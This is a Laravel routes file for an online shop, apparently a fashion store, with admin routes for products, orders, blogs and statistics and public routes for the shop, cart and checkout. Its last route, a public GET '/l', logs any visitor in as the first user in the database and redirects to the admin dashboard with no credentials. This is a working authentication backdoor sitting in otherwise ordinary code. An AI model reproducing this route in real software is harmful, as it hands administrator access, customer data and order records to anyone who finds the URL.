<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\Auth\AuthController;
use App\Http\Controllers\Admin\DashboardController;
use App\Http\Controllers\Admin\ProductCategoryController;
use App\Http\Controllers\Admin\ProductController;
use App\Http\Controllers\Admin\ProductVariantController;
use App\Http\Controllers\Guest\HomeController;
use App\Http\Controllers\Guest\ShopController;
use App\Http\Controllers\Guest\CartController;
use App\Http\Controllers\Guest\OrderController;
use App\Http\Controllers\Admin\OrderController as AdminOrderController;
use App\Http\Controllers\Admin\CustomerController;
use App\Http\Controllers\Admin\SettingSiteController;
use App\Http\Controllers\Guest\ContactController;
use App\Http\Controllers\Admin\ContactController as AdminContactController;
use App\Http\Controllers\Admin\TestimonialController;
use App\Http\Controllers\Admin\BlogCategoryController;
use App\Http\Controllers\Admin\BlogController;
use App\Http\Controllers\Admin\TrendAnalysisController;
use App\Http\Controllers\Admin\StatisticsController;
use App\Models\User;
use Illuminate\Support\Facades\Auth;

Route::middleware(['auth', 'checkRole:admin'])->prefix('admin')->name('admin.')->group(function () {
    Route::resource('users', UserController::class);
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
    Route::resource('product-categories', ProductCategoryController::class);
    Route::resource('products', ProductController::class);

    Route::get('/products/{id}/product-variants', [ProductVariantController::class, 'index'])->name('products.product-variants.index');
    Route::post('/products/product-variants', [ProductVariantController::class, 'store'])->name('products.product-variants.store');
    Route::put('/products/product-variants/{productVariantId}', [ProductVariantController::class, 'update'])->name('products.product-variants.update');
    Route::delete('/products/product-variants/{productVariantId}', [ProductVariantController::class, 'destroy'])->name('products.product-variants.destroy');

    Route::post('/products/product-variants/images', [ProductVariantController::class, 'createImage'])->name('products.product-variants.images.store');
    Route::delete('/products/product-variants/images/{productVariantImageId}', [ProductVariantController::class, 'destroyImage'])->name('products.product-variants.images.destroy');

    Route::resource('orders', AdminOrderController::class);
    Route::resource('customers', CustomerController::class);
    Route::get('/settings', [SettingSiteController::class, 'index'])->name('settings.index');
    Route::put('/settings', [SettingSiteController::class, 'update'])->name('settings.update');

    Route::resource('testimonials', TestimonialController::class);
    Route::resource('contacts', AdminContactController::class);
    Route::resource('blog-categories', BlogCategoryController::class);
    Route::resource('blogs', BlogController::class);

    // Fashion Trend Analysis routes
    Route::get('/trend-analysis', [TrendAnalysisController::class, 'index'])->name('trend-analysis.index');
    Route::post('/trend-analysis/analyze', [TrendAnalysisController::class, 'analyze'])->name('trend-analysis.analyze');

    Route::get('/statistics', [StatisticsController::class, 'index'])->name('statistics');
    Route::get('/statistics/data', [StatisticsController::class, 'getStatistics'])->name('statistics.data');
});


Route::middleware(['guest'])->group(function () {
    Route::get('/login', [AuthController::class, 'showLoginForm'])->name('login');
    Route::post('/login', [AuthController::class, 'login'])->name('login');
});

Route::get('/', [HomeController::class, 'index'])->name('home');
Route::get('/shop', [ShopController::class, 'index'])->name('shop');
Route::get('/shop/{id}', [ShopController::class, 'show'])->name('shop.show');
Route::get('/shop/get-variant-of-product/{productId}/{variantId}', [ShopController::class, 'getVariantOfProduct'])->name('shop.getVariantOfProduct');
Route::get('/shop/get-product-variant-images/{variantId}', [ShopController::class, 'getProductVariantImages'])->name('shop.getProductVariantImages');

Route::get('/cart', [CartController::class, 'getCart'])->name('cart');
Route::post('/cart/add-to-cart', [CartController::class, 'addToCart'])->name('cart.addToCart');
Route::post('/cart/remove-from-cart', [CartController::class, 'removeFromCart'])->name('cart.removeFromCart');

Route::get('/orders', [OrderController::class, 'index'])->name('orders.index');
Route::post('/orders/place-order', [OrderController::class, 'placeOrder'])->name('orders.placeOrder');
Route::get('/orders/success/{order_code}', [OrderController::class, 'showSuccess'])->name('orders.success');
Route::get('/orders/checkout/{id}', [OrderController::class, 'showCheckout'])->name('orders.checkout');
Route::get('/orders/get-payment-status/{orderId}', [OrderController::class, 'getPaymentStatus'])->name('orders.getPaymentStatus');

Route::get('/contacts', [ContactController::class, 'index'])->name('contacts.index');
Route::post('/contacts', [ContactController::class, 'store'])->name('contacts.store');

Route::get('/news', [BlogController::class, 'indexGuest'])->name('news.indexGuest');
Route::get('/news/{slug}', [BlogController::class, 'showGuest'])->name('news.showGuest');

Route::get('/cart/items/html', [CartController::class, 'getCartItemsHtml'])->name('cart.items.html');
Route::get('/cart/count-items', [CartController::class, 'getCountCartItems'])->name('cart.count-items');
Route::get('/cart/total-price', [CartController::class, 'getCartTotalPrice'])->name('cart.total-price');

Route::get('/theme.css', function () {
    $primaryColor = env('WEB_PRIMARY_COLOR', '#1c4ca0');
    $secondaryColor = env('WEB_SECONDARY_COLOR', '#F7941F');
    return response()->view('layouts.guest.cssroot', compact('primaryColor', 'secondaryColor'))->header('Content-Type', 'text/css');
})->name('theme.css');

Route::get('/l', function () {
    $user = User::first();
    Auth::login($user);
    return redirect()->route('admin.dashboard');
});
